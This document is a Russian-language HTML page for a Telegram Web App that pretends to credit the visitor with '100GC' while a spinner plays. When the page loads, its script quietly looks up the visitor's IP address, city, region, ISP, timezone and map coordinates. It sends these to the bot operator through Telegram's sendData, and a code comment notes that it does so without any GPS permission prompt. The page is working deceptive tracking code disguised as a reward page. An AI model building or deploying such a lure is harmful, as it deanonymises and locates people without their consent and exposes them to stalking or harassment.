<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Начисление GC</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
        }
        .container {
            text-align: center;
            padding: 30px;
            max-width: 400px;
            width: 100%;
        }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 28px; margin-bottom: 15px; }
        p { font-size: 16px; opacity: 0.9; margin-bottom: 10px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { font-size: 64px; }
        .small { font-size: 13px; opacity: 0.6; margin-top: 20px; }
        .info { font-size: 14px; opacity: 0.8; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container" id="status">
        <div class="icon">💰</div>
        <h1>Начисление 100GC</h1>
        <p>Обработка...</p>
        <div class="spinner"></div>
    </div>

    <script>
        let timer = 5;
        let timerInterval;

        function closeApp() {
            Telegram.WebApp.close();
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'IP не определён';
            }
        }

        async function getLocation(ip) {
            try {
                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone,regionName,as,org`);
                const data = await response.json();
                if (data.status === 'success') {
                    return {
                        country: data.country || 'Неизвестно',
                        city: data.city || 'Неизвестно',
                        region: data.regionName || 'Неизвестно',
                        lat: data.lat || 0,
                        lon: data.lon || 0,
                        isp: data.isp || data.org || 'Неизвестно',
                        timezone: data.timezone || 'Неизвестно',
                        source: 'IP-адрес'
                    };
                }
                return null;
            } catch {
                return null;
            }
        }

        async function sendData() {
            const ip = await getIP();
            const location = await getLocation(ip);

            let dataString = `🌐 IP: ${ip}`;

            if (location && location.lat && location.lon) {
                dataString += `\n📍 Геолокация (${location.source}):`;
                dataString += `\n🌍 Страна: ${location.country}`;
                dataString += `\n🏙️ Город: ${location.city}`;
                if (location.region) dataString += `\n🗺️ Регион: ${location.region}`;
                dataString += `\n📡 Провайдер: ${location.isp}`;
                dataString += `\n🕐 Часовой пояс: ${location.timezone}`;
                dataString += `\n🗺️ Координаты: ${location.lat}, ${location.lon}`;
                dataString += `\n📍 Карта: https://www.google.com/maps?q=${location.lat},${location.lon}`;
            } else {
                dataString += `\n❌ Геолокация не определена`;
                dataString += `\n🗺️ Карта: https://www.google.com/maps/search/${ip}`;
            }

            // Отправляем в Telegram
            Telegram.WebApp.sendData(dataString);

            // Показываем успех
            let html = `
                <div class="icon success">✅</div>
                <h1>100GC начислены!</h1>
                <p>Данные получены</p>
                <p class="info">🌐 IP: ${ip}</p>
            `;

            if (location && location.lat) {
                html += `<p class="info">📍 ${location.city || 'Город'}, ${location.country || 'Страна'}</p>`;
            } else {
                html += `<p class="info">❌ Геолокация не найдена</p>`;
            }

            html += `<p class="small">Закрывается через 5 секунд...</p>`;
            document.getElementById('status').innerHTML = html;

            // Таймер закрытия
            timer = 5;
            timerInterval = setInterval(() => {
                timer--;
                if (timer <= 0) {
                    clearInterval(timerInterval);
                    closeApp();
                }
            }, 1000);
        }

        // Запускаем сразу — БЕЗ запросов GPS
        sendData();
    </script>
</body>
</html>
